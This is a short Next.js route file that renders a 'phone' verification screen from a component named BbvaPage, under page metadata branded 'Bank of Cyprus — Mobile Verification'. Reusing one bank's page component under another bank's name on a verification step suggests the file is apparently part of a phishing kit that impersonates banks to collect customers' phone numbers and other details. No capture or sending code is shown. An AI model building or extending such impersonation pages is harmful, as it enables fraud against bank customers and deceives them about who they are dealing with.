import BbvaPage from "../page"

export const metadata = {
  title: "Bank of Cyprus — Mobile Verification",
  description: "Bank of Cyprus Mobile Banking",
}

export default function PhoneRoutePage() {
  return <BbvaPage initialScreen="phone" />
}

